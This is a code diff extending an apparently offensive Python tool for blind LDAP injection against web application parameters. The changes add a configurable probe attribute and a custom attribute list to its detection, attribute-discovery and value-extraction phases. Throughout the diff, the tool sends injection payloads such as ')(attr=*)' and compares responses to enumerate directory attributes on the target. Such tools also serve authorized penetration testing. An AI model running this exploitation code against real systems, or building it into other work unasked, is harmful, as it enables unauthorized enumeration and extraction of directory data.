@@ -271,6 +271,7 @@ def detect_injection(
     true_length: int,
     verbose: bool = False,
     use_json: bool = False,
+    probe_attr: str = "objectClass",
 ) -> bool:
     """
     Probe the target with common LDAP meta-characters and logic payloads.
@@ -278,12 +279,26 @@ def detect_injection(
     Prints a report of which payloads caused a different response, which
     indicates that the parameter is embedded in an LDAP query without sanitization.
 
+    *probe_attr* is the LDAP attribute used in the AND/OR logic probes (e.g.
+    ``)(attr=*))(&(attr=``).  It defaults to ``objectClass`` which is present
+    on every LDAP entry, but you can supply any attribute that is known to
+    exist on the target entry so that the probes do not rely on ``objectClass``
+    being present.
+
     Returns True if at least one payload produced a distinguishable response.
     """
     print("\n[*] --- Detection Phase ---")
     vulnerable = False
 
-    for payload in DETECTION_PAYLOADS:
+    # Build probes dynamically so the caller controls which attribute is used
+    detection_payloads = [
+        p.replace("objectClass", probe_attr) for p in DETECTION_PAYLOADS
+    ]
+    logic_payloads = {
+        k: v.replace("objectClass", probe_attr) for k, v in LOGIC_PAYLOADS.items()
+    }
+
+    for payload in detection_payloads:
         data = build_payload_data(base_data, param, payload, use_json)
         resp = send_request(session, url, data, verbose, use_json)
         if resp is None:
@@ -303,7 +318,7 @@ def detect_injection(
 
     # AND / OR logic probes
     print("\n[*] AND/OR logic probes:")
-    for label, payload in LOGIC_PAYLOADS.items():
+    for label, payload in logic_payloads.items():
         data = build_payload_data(base_data, param, payload, use_json)
         resp = send_request(session, url, data, verbose, use_json)
         if resp is None:
@@ -333,19 +348,26 @@ def discover_attributes(
     true_length: int,
     verbose: bool = False,
     use_json: bool = False,
+    attributes: list[str] | None = None,
 ) -> list[str]:
     """
-    Iterate through COMMON_ATTRIBUTES and test each with a wildcard payload.
+    Iterate through *attributes* and test each with a wildcard payload.
 
     The payload format is: )(attribute=*)
     A "true" response implies that attribute exists on the LDAP entry.
 
+    When *attributes* is ``None`` the built-in ``COMMON_ATTRIBUTES`` list is
+    used.  Pass a custom list (e.g. built from ``--attributes``) to extend or
+    replace that default set.
+
     Returns the list of attributes that appear to exist.
     """
+    if attributes is None:
+        attributes = COMMON_ATTRIBUTES
     print("\n[*] --- Attribute Discovery Phase ---")
     found: list[str] = []
 
-    for attr in COMMON_ATTRIBUTES:
+    for attr in attributes:
         payload = f")({attr}=*)"
         data = build_payload_data(base_data, param, payload, use_json)
         resp = send_request(session, url, data, verbose, use_json)
@@ -475,6 +497,20 @@ def parse_args() -> argparse.Namespace:
         ),
     )
     parser.add_argument(
+        "--attributes",
+        metavar="ATTR",
+        action="append",
+        default=None,
+        dest="attributes",
+        help=(
+            "Additional LDAP attribute to include in discovery "
+            "(can be repeated, e.g. --attributes uid --attributes cn). "
+            "The first supplied attribute is also used as the probe attribute "
+            "in injection detection instead of the default 'objectClass', so "
+            "the tool does not need objectClass to be present on the entry."
+        ),
+    )
+    parser.add_argument(
         "-v", "--verbose",
         action="store_true",
         default=False,
@@ -526,6 +562,22 @@ def main() -> None:
     if args.verbose:
         print("[*] Verbose : enabled")
 
+    # Build the attribute list and choose a probe attribute for detection.
+    # Extra attributes are prepended so they appear first in discovery output
+    # and the first one is used as the probe attribute in logic probes (so the
+    # tool does not rely on objectClass being present when the caller knows
+    # which attributes actually exist on the target entries).
+    extra_attrs: list[str] = args.attributes or []
+    if extra_attrs:
+        # Deduplicate while preserving order (extra attrs first)
+        all_attrs = list(dict.fromkeys(extra_attrs + COMMON_ATTRIBUTES))
+        probe_attr = extra_attrs[0]
+        print(f"[*] Extra attributes: {', '.join(extra_attrs)}")
+        print(f"[*] Probe attribute : {probe_attr}")
+    else:
+        all_attrs = COMMON_ATTRIBUTES
+        probe_attr = "objectClass"
+
     session = build_session(args.proxy)
 
     # 1. Baseline
@@ -538,7 +590,8 @@ def main() -> None:
 
     # 3. Detection
     vulnerable = detect_injection(
-        session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json
+        session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json,
+        probe_attr,
     )
 
     if not vulnerable:
@@ -561,7 +614,8 @@ def main() -> None:
             print(f"\n[-] Could not extract value for attribute '{args.extract}'.")
     else:
         attrs = discover_attributes(
-            session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json
+            session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json,
+            all_attrs,
         )
         if attrs:
             print(f"\n[+] Discovered attributes: {', '.join(attrs)}")
